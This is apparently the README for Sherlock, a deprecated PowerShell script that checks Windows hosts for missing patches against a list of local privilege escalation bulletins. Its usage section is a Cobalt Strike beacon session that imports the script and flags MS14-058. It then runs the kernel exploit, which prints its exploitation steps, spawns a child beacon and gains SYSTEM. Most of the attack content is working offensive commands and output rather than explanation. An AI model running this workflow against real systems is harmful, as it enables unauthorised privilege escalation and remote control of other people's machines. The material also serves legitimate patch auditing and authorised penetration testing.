> Deprecated.  Have a look at [Watson](https://github.com/rasta-mouse/Watson) instead.

# Sherlock

PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.

## Currently looks for:

* MS10-015 : User Mode to Ring (KiTrap0D)
* MS10-092 : Task Scheduler
* MS13-053 : NTUserMessageCall Win32k Kernel Pool Overflow
* MS13-081 : TrackPopupMenuEx Win32k NULL Page
* MS14-058 : TrackPopupMenu Win32k Null Pointer Dereference
* MS15-051 : ClientCopyImage Win32k
* MS15-078 : Font Driver Buffer Overflow
* MS16-016 : 'mrxdav.sys' WebDAV
* MS16-032 : Secondary Logon Handle
* MS16-034 : Windows Kernel-Mode Drivers EoP
* MS16-135 : Win32k Elevation of Privilege
* CVE-2017-7199 : Nessus Agent 6.6.2 - 6.10.3 Priv Esc

## Basic Usage:

```
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 20 bytes
[*] You are Win7-x64\Rasta

beacon> powershell-import C:\Users\Rasta\Desktop\Sherlock.ps1
[*] Tasked beacon to import: C:\Users\Rasta\Desktop\Sherlock.ps1
[+] host called home, sent: 2960 bytes

beacon> powershell Find-MS14058
[*] Tasked beacon to run: Find-MS14058
[+] host called home, sent: 20 bytes
[+] received output:

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Appears Vulnerable

beacon> elevate ms14-058 smb
[*] Tasked beacon to elevate and spawn windows/beacon_smb/bind_pipe (127.0.0.1:1337)
[+] host called home, sent: 105015 bytes
[+] received output:
[*] Getting Windows version...
[*] Solving symbols...
[*] Requesting Kernel loaded modules...
[*] pZwQuerySystemInformation required length 51216
[*] Parsing SYSTEM_INFO...
[*] 173 Kernel modules found
[*] Checking module \SystemRoot\system32\ntoskrnl.exe
[*] Good! nt found as ntoskrnl.exe at 0x0264f000
[*] ntoskrnl.exe loaded in userspace at: 40000000
[*] pPsLookupProcessByProcessId in kernel: 0xFFFFF800029A21FC
[*] pPsReferencePrimaryToken in kernel: 0xFFFFF800029A59D0
[*] Registering class...
[*] Creating window...
[*] Allocating null page...
[*] Getting PtiCurrent...
[*] Good! dwThreadInfoPtr 0xFFFFF900C1E7B8B0
[*] Creating a fake structure at NULL...
[*] Triggering vulnerability...
[!] Executing payload...

[+] host called home, sent: 204885 bytes
[+] established link to child beacon: 192.168.56.105

beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 8 bytes
[*] You are NT AUTHORITY\SYSTEM (admin)
```